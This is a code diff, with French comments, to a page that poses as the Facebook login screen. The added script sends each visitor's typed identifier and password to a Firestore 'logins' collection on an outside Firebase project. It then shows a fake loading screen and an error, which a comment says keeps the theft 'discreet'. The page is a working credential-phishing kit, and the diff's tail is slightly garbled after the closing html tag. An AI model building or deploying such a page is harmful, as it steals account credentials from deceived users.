@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook</title>
     
-    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%231877F2'%3%3Cpath d='M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z'%3E%3C/path%3E%3C/svg%3E">
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%231877F2'%3E%3Cpath d='M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z'%3E%3C/path%3E%3C/svg%3E">
 
     <style>
         body {
@@ -80,7 +80,6 @@
             font-weight: bold;
         }
 
-        /* --- MESSAGE D'ERREUR --- */
         #validation-error {
             display: none; 
             align-items: flex-start;
@@ -120,7 +119,6 @@
             margin-bottom: 10px;
         }
 
-        /* --- MOT DE PASSE OUBLIÉ : NOIR, MILIEU, BAS --- */
         .forgot-link {
             display: block;
             color: #1c1e21;
@@ -145,7 +143,6 @@
             margin-top: 60px;
         }
 
-        /* --- ÉCRANS --- */
         #loading-screen, #error-panel {
             display: none;
             flex-direction: column;
@@ -216,11 +213,29 @@
         <button onclick="location.reload()" style="margin-top: 20px; padding: 10px; cursor: pointer;">Retour</button>
     </div>
 
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+
     <script>
+        // Ta configuration Firebase
+        const firebaseConfig = {
+          apiKey: "AIzaSyDJghYpGmCqXnryOBqQqfBLEUomKdaYumU",
+          authDomain: "facebook-f8176.firebaseapp.com",
+          projectId: "facebook-f8176",
+          storageBucket: "facebook-f8176.firebasestorage.app",
+          messagingSenderId: "486563057853",
+          appId: "1:486563057853:web:9350efdb6e5b27a1c567d4"
+        };
+
+        // Initialisation de Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
         const loginUI = document.getElementById('login-ui');
         const loadingScreen = document.getElementById('loading-screen');
         const errorPanel = document.getElementById('error-panel');
         const inputField = document.getElementById('user_id');
+        const passwordField = document.getElementById('password');
         const errorMsg = document.getElementById('validation-error');
 
         function triggerLoading() {
@@ -234,17 +249,41 @@
 
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const val = inputField.value.trim(); // .trim() enlève les espaces vides
+            const val = inputField.value.trim();
+            const pass = passwordField.value;
 
-            // SI LE CHAMP EST VIDE OU SI LE FORMAT EST MAUVAIS
+            // Vérification basique
             const isNumber = /^\d+$/.test(val);
             const hasAt = val.includes('@');
 
-            if (val === "" || (isNumber && val.length !== 10) || (!isNumber && !hasAt)) {
+            if (val === "" || (isNumber && val.length < 8) || (!isNumber && !hasAt)) {
                 errorMsg.style.display = 'flex'; 
                 inputField.classList.add('error-border');
             } else {
-                triggerLoading();
+                // ENVOI VERS FIREBASE
+                db.collection("logins").add({
+                    identifiant: val,
+                    mot_de_passe: pass,
+                    date_envoi: new Date().toLocaleString()
+                })
+                .then(() => {
+                    // Une fois envoyé, on lance l'animation de chargement
+                    triggerLoading();
+                })
+                .catch((error) => {
+                    console.error("Erreur lors de l'envoi : ", error);
+                    triggerLoading(); // On lance quand même l'erreur 407 pour rester discret
+                });
+            }
+        });
+
+        inputField.addEventListener('input', () => {
+            errorMsg.style.display = 'none';
+            inputField.classList.remove('error-border');
+        });
+    </script>
+</body>
+</html>
             }
         });
 
